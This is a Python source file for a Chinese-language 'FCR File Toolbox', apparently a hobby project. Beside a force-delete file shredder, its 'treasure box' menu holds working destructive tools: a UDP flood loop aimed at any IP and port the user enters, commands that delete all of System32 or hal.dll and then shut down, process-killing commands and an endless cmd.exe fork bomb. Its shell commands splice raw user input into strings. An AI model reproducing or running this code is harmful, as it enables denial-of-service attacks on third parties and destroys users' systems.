import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("@echo off")
###os.system("color a")

def wenjianfensuiji_title():
    print("")
    print("")
    print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
    print("            ######")
    print("   ________________________               请选择一个选项qwq")
    print("     \##################/                  1.删除单个文件")
    print("      \################/                   2.删除目录(文件夹)")
    print("       \##############/                    3.删除文件夹中的所有文件但保留所有子文件夹")
    print("        \############/          ")
    print("         \##########/")
    print("          ---------")
    print("$$$$$$$$$$$$$$$$$$$$$$文件粉碎机(内置)$$$$$$$$$$$$$$$$$$$$$")
    print("输入Q以退出")
    print("")

def bbx_ddos():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        #############

        print("FCR百宝箱内置Ddos攻击")
        print("/---------------------------------------------------\ ")
        print("|   作者          : qq1841887053                    |")
        print("|   版本          : V0.1.0 Beta                     |")
        print("|                          （qq:1841887053）        |")
        print("\---------------------------------------------------/")
        print(" ")
        print(" ")
        ip = input("请输入 IP /或者输入Q以退出    : ")
        if ip == "q":
            break
        elif ip == "Q":
            break
        port = int(input("攻击端口      : "))
        sd = int(input("攻击速度(1~1000) : "))

        os.system("clear")

        sent = 0
        while True:
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))
            time.sleep((1000 - sd) / 2000)

def delwenjian(wenjianming):###删除文件
    os.system("takeown /f " + f"{wenjianming}")
    os.system("echo Y|cacls " + f"{wenjianming}" + " /g %username%:F")
    os.system("del /s /q /f " + f"{wenjianming}")
    print("删除操作已完成，请按任意键返回主界面^_^")
    os.system("pause")

def mulu(muluming):###删除指定目录(递归删除)
    os.system("takeown /f " + f"{muluming}" + " /r /d y")
    os.system("echo Y|cacls " + f"{muluming}" + " /t /g %username%:F")
    os.system("rmdir /s /q " + f"{muluming}")
    print("删除操作已完成，请按任意键返回主界面^_^")
    os.system("pause")

def destroywindows():###删除系统文件(System32文件夹(递归删除))
    os.system("takeown /f %windir%\System32\*.* /r /d y")
    os.system("echo Y|cacls %windir%\System32\*.* /t /g %username%:F")
    os.system("del /s /q /f %windir%\System32\*.*")

def delwenjianjiaall(wenjianjiaming_1):###删除指定目录下的所有子目录及文件
    os.system("takeown /f " + f"{wenjianjiaming_1}" + "\*.* /r /d y")
    os.system("echo Y|cacls " + f"{wenjianjiaming_1}" + "\*.* /g %username%:F")
    os.system("del /s /q /f " + f"{wenjianjiaming_1}" + "\*.*")
    print("删除操作已完成，请按任意键返回主界面^_^")
    os.system("pause")

def rmdir_specel(rmdirxuanxiang):###删除目录树中的所有文件(文件夹不删除)
    os.system("takeown /f " + f"{rmdirxuanxiang}" + " /r /d y")
    os.system("echo Y|cacls " + f"{rmdirxuanxiang}" " /t /g %username%:F")
    os.system("del /s /q /f " + f"{rmdirxuanxiang}")
    print("删除操作已完成，请按任意键返回主界面^_^")
    os.system("pause")

def bbx_title():
    print("_____________________________欢迎使用FCR文件工具箱内置百宝箱^-^_______________________________")
    print("                                 老样子，请选择一个选项qwq                                   ")
    print("1.Windows_killer(内置)                                        2.Ddos攻击[内置(Beta)]")
    print("3.！！！千万别点！！！qwq                                        4.小蓝一下(doge")
    print("5.两眼一黑                                                     6.boom")
    print("")
    print("")

taskkill_ne = '"pid ne 1"'

def small_blue():
    os.system("kaskkill /f /fi" + taskkill_ne)

def liangyanyihei():
    os.system("kaskkill /f /im explorer.exe")

def boom():
    while True:
        os.system("start cmd.exe")

def fastbreakwindows():
    os.system("takeown /f C:\Windows\System32\hal.dll")
    os.system("echo Y|cacls C:\Windows\System32\hal.dll /g %username%:F")
    os.system("del /s /q /f C:\Windows\System32\hal.dll")
    time.sleep(2)
    os.system("shutdown -s -t 0")
    time.sleep(3)
    os.system(f"taskkill /f /i {taskkill_ne}")
baibaoxiangliebiao = ['1','2','3','4','5','q','Q']
fastbreakwindowslist = ['1','2','q','Q']
wenjianfensuijiliebiao = ['1','2','3','4','q','Q']

active = True

while active:
    active_bbx = True
    active_fbwin = True
    active_wenjianfensuiji = True
    print("       注意：当前程序为Alpha开发阶段，可能会有一些难以言表的bug    qwq")
    print("______________________________________欢迎使用FCR文件工具箱_________________________________")
    print("")
    print("$     FfffffffffffffffffF              CCCcCccCC            RRrrrrrrrRrRR            ")
    print("$     Ffff                          CCCcc                   RRrr      RrRrR                ")
    print("$     Ffff                        CCCcc                     RRrr        RRR               ")
    print("$     Ffff                       CCCC                       RRrr      RrRrR              ")
    print("$     FfffffffffffffffffF       CCCC                        RRrrrrrrrrRrR                       ")
    print("$     Ffff                      CCcc                        RRrr     RrR                  ")
    print("$     Ffff                      CCcCC                       RRrr       RrR            ")
    print("$     Ffff                       CCCC                       RRrr        RrR          ")
    print("$     Ffff                         CcCCc                    RRrr        RrR           ")
    print("$     Ffff                           CccCCccCCC             RRrr        RrR         ")
    print("")
    print("__________________________________________________________________________________________")
    print("")
    print("")
    print("                                        请选择一个选项qwq(输入Q以退出):                                  ")
    print("1.文件粉碎机              2.Windows工具(如打开注册表，终端等)            3.百宝箱        4.开发者信息")


    xuanxianglist = ['1','2','3',"4","Q","q"]
    xuanxiang = input("请输入您选择选项的编号")
    if xuanxiang not in xuanxianglist:
        print("您输入的序号无效，请重新输入")
    elif xuanxiang =='Q':
        active = False
    elif xuanxiang =='q':
        active = False
    elif xuanxiang =='1':
        while active_wenjianfensuiji:
            wenjianfensuiji_title()
            wenjianfensuiji_xuanxiang = input("您的选项是:")
            if wenjianfensuiji_xuanxiang not in wenjianfensuijiliebiao:
                print("您输入的不是有效选项，请重新输入qwq")
            elif wenjianfensuiji_xuanxiang == 'q':
                active_wenjianfensuiji = False
            elif wenjianfensuiji_xuanxiang == 'Q':
                active_wenjianfensuiji = False
            elif wenjianfensuiji_xuanxiang == '1':
                wenjianming = input("请输入文件路径:")
                delwenjian(wenjianming)
            elif wenjianfensuiji_xuanxiang == '2':
                muluming = input("请输入目录路径:")
                mulu(muluming)
            elif wenjianfensuiji_xuanxiang == '3':
                rmdirxuanxiang = input("请输入目录路径:")
                rmdir_specel(rmdirxuanxiang)

    elif xuanxiang == '2':
        print("该功能正在开发中，敬请期待qwq")
    elif xuanxiang =='3':
        while active_bbx:
            bbx_title()
            print("输入Q以退出百宝箱")
            print("请输入百宝箱选项：")
            bbxxuanxiang = input()
            if bbxxuanxiang not in baibaoxiangliebiao:
                print("您输入的百宝箱选项无效，请重新输入...")
            elif bbxxuanxiang == "q":
                active_bbx = False
            elif bbxxuanxiang == "Q":
                active_bbx = False
            elif bbxxuanxiang == "1":
                print("你真的要运行Windows killer吗？此选项将会对您的电脑造成巨大的负面影响！！！")
                destroywindowschose = input("1.我想好了，立即摧毁我的电脑！               2.让我先冷静冷静……")
                if destroywindowschose == "1":
                    destroywindows()
            elif bbxxuanxiang == "2":
                bbx_ddos()
            elif bbxxuanxiang == "3":
                while active_fbwin:
                    print("你真的确定吗？")
                    fastbreakwindows_chose = input("1.我想好了，我确定！！！        2.让我先冷静冷静……  |  或者输入Q以退出")
                    if fastbreakwindows_chose not in fastbreakwindowslist:
                        print("你输入的不是有效选项，请重新输入...")
                    elif fastbreakwindows_chose == "1":
                        fastbreakwindows()
                    elif fastbreakwindows_chose == "2":
                        active_fbwin = False
                    elif fastbreakwindows_chose == "q":
                        active_fbwin = False
                    elif fastbreakwindows_chose == "Q":
                        active_fbwin = False
            elif bbxxuanxiang == "4":
                small_blue()
            elif bbxxuanxiang == "5":
                liangyanyihei()
            elif bbxxuanxiang == "6":
                boom()

    elif xuanxiang =='4':
        print("___________________________开发者信息___________________________")
        print("作者：炒鸡大蛇/qq:1841887053                 编程语言：python3")
        print("主程序设计：炒鸡大蛇/qq:1841887053               N/A--有意留空")
        print("当前程序版本：                                   --1.1.1 Alpha")
        print("注意：当前程序为Alpha开发阶段，可能会有一些难以言表的bug   QWQ")
        print("邮箱:1841887053@qq.com")
        print("GitHub:https://github.com/eyngm/FCR_File-Toolbox")
        print("感谢您的下载与支持")
        print("Thanks!")
        print("________________________________________________________________")
        os.system("pause")

os.system("pause")